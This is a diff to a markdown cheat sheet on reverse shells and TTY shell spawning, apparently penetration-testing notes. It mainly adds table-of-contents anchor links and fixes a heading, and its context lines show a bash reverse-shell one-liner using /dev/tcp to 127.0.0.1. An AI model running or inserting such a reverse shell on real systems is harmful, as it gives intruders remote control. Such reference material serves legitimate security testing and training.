@@ -3,11 +3,11 @@ ____
 ### Reverse shell
 * #### [Bash](#reverse_shell_bash)
 * #### [Python](#reverse_shell_python)
-* #### Netcat
-* #### PHP
-* #### Telnet
-* #### Ruby
-* #### Perl
+* #### [Netcat](#reverse_shell_netcat)
+* #### [PHP](#reverse_shell_php)
+* #### [Telnet](#reverse_shell_telnet)
+* #### [Ruby](#reverse_shell_ruby)
+* #### [Perl](#reverse_shell_perl)
 ### TTY Spawn Shell
 * #### Python spawn shell
 * #### OS system spawn shell
@@ -63,7 +63,7 @@ ____
 
 ____
 
-### Reverse shell > <a name="reverse_shell_bash"></a>bash
+### Reverse shell > <a name="reverse_shell_bash"></a>Bash
 bash -c 'exec bash -i &>/dev/tcp/127.0.0.1/1234 <&1'  
   
   
